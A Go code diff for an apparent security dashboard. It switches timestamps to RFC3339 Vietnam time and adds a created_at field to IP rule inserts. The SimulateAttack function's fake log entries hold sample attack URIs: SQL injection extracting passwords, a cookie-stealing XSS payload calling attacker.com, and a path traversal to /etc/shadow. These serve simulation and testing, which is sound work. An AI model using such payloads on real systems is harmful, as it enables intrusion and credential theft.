@@ -629,17 +629,18 @@ func AddIPRule(c *gin.Context) {
 		} else {
 			expTime := services.ParseDurationToExpiration(dur)
 			if expTime != nil {
-				formatted := expTime.Format("2006-01-02 15:04:05")
+				formatted := expTime.Format(time.RFC3339)
 				expiresAtVal = &formatted
 			}
 		}
 	}
 
+	createdAtVal := services.VietnamNowRFC3339()
 	_, err := database.DB.Exec(
-		`INSERT INTO ip_rules (ip, rule_type, reason, expires_at)
-		 VALUES (?, ?, ?, ?)
-		 ON CONFLICT(ip) DO UPDATE SET rule_type=excluded.rule_type, reason=excluded.reason, expires_at=excluded.expires_at`,
-		req.IP, req.RuleType, req.Reason, expiresAtVal,
+		`INSERT INTO ip_rules (ip, rule_type, reason, created_at, expires_at)
+		 VALUES (?, ?, ?, ?, ?)
+		 ON CONFLICT(ip) DO UPDATE SET rule_type=excluded.rule_type, reason=excluded.reason, created_at=excluded.created_at, expires_at=excluded.expires_at`,
+		req.IP, req.RuleType, req.Reason, createdAtVal, expiresAtVal,
 	)
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
@@ -714,7 +715,7 @@ func SimulateAttack(c *gin.Context) {
 		logItem = database.AttackLog{
 			TxnID:      fmt.Sprintf("sim-%d", time.Now().UnixNano()),
 			ClientIP:   "192.168.246.1",
-			Timestamp:  time.Now().Format("2006-01-02 15:04:05"),
+			Timestamp:  services.VietnamNowRFC3339(),
 			Method:     "GET",
 			URI:        "/?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
 			UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Simulation/1.0",
@@ -729,7 +730,7 @@ func SimulateAttack(c *gin.Context) {
 		logItem = database.AttackLog{
 			TxnID:      fmt.Sprintf("sim-%d", time.Now().UnixNano()),
 			ClientIP:   "192.168.246.1",
-			Timestamp:  time.Now().Format("2006-01-02 15:04:05"),
+			Timestamp:  services.VietnamNowRFC3339(),
 			Method:     "GET",
 			URI:        "/?search=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
 			UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Simulation/1.0",
@@ -744,7 +745,7 @@ func SimulateAttack(c *gin.Context) {
 		logItem = database.AttackLog{
 			TxnID:      fmt.Sprintf("sim-%d", time.Now().UnixNano()),
 			ClientIP:   "192.168.246.1",
-			Timestamp:  time.Now().Format("2006-01-02 15:04:05"),
+			Timestamp:  services.VietnamNowRFC3339(),
 			Method:     "GET",
 			URI:        "/?page=../../../../etc/shadow",
 			UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Simulation/1.0",
@@ -759,7 +760,7 @@ func SimulateAttack(c *gin.Context) {
 		logItem = database.AttackLog{
 			TxnID:      fmt.Sprintf("sim-%d", time.Now().UnixNano()),
 			ClientIP:   "45.33.32.156",
-			Timestamp:  time.Now().Format("2006-01-02 15:04:05"),
+			Timestamp:  services.VietnamNowRFC3339(),
 			Method:     "GET",
 			URI:        "/admin.php",
 			UserAgent:  "sqlmap/1.6#stable",
